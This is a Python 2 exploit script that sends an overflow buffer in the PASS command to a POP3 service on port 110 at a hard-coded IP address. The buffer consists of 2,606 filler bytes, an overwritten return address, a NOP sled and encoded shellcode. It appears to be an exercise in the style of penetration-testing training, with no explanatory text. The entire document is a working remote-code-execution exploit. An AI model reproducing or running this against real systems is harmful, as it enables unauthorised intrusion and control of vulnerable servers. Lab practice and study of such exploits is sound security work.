#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode=("\xb8\xad\xf2\x90\xe3\xd9\xc8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x6e\xf6\x72\x16\x8c\x1f\xf0"
"\xd9\x6c\xe0\x95\x50\x89\xd1\x95\x07\xda\x42\x26\x43\x8e\x6e"
"\xcd\x01\x3a\xe4\xa3\x8d\x4d\x4d\x09\xe8\x60\x4e\x22\xc8\xe3"
"\xcc\x39\x1d\xc3\xed\xf1\x50\x02\x29\xef\x99\x56\xe2\x7b\x0f"
"\x46\x87\x36\x8c\xed\xdb\xd7\x94\x12\xab\xd6\xb5\x85\xa7\x80"
"\x15\x24\x6b\xb9\x1f\x3e\x68\x84\xd6\xb5\x5a\x72\xe9\x1f\x93"
"\x7b\x46\x5e\x1b\x8e\x96\xa7\x9c\x71\xed\xd1\xde\x0c\xf6\x26"
"\x9c\xca\x73\xbc\x06\x98\x24\x18\xb6\x4d\xb2\xeb\xb4\x3a\xb0"
"\xb3\xd8\xbd\x15\xc8\xe5\x36\x98\x1e\x6c\x0c\xbf\xba\x34\xd6"
"\xde\x9b\x90\xb9\xdf\xfb\x7a\x65\x7a\x70\x96\x72\xf7\xdb\xff"
"\xb7\x3a\xe3\xff\xdf\x4d\x90\xcd\x40\xe6\x3e\x7e\x08\x20\xb9"
"\x81\x23\x94\x55\x7c\xcc\xe5\x7c\xbb\x98\xb5\x16\x6a\xa1\x5d"
"\xe6\x93\x74\xf1\xb6\x3b\x27\xb2\x66\xfc\x97\x5a\x6c\xf3\xc8"
"\x7b\x8f\xd9\x60\x11\x6a\x8a\x85\xed\x7f\x48\xf2\xf3\x7f\x49"
"\x3b\x7d\x99\x3b\x2b\x2b\x32\xd4\xd2\x76\xc8\x45\x1a\xad\xb5"
"\x46\x90\x42\x4a\x08\x51\x2e\x58\xfd\x91\x65\x02\xa8\xae\x53"
"\x2a\x36\x3c\x38\xaa\x31\x5d\x97\xfd\x16\x93\xee\x6b\x8b\x8a"
"\x58\x89\x56\x4a\xa2\x09\x8d\xaf\x2d\x90\x40\x8b\x09\x82\x9c"
"\x14\x16\xf6\x70\x43\xc0\xa0\x36\x3d\xa2\x1a\xe1\x92\x6c\xca"
"\x74\xd9\xae\x8c\x78\x34\x59\x70\xc8\xe1\x1c\x8f\xe5\x65\xa9"
"\xe8\x1b\x16\x56\x23\x98\x36\xb5\xe1\xd5\xde\x60\x60\x54\x83"
"\x92\x5f\x9b\xba\x10\x55\x64\x39\x08\x1c\x61\x05\x8e\xcd\x1b"
"\x16\x7b\xf1\x88\x17\xae")

buffer = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode
try:
	print "\nSending evil buffer..."
	s.connect(('11.11.11.7',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\nDone!."
except:
	print "Could not connect to POP3!"
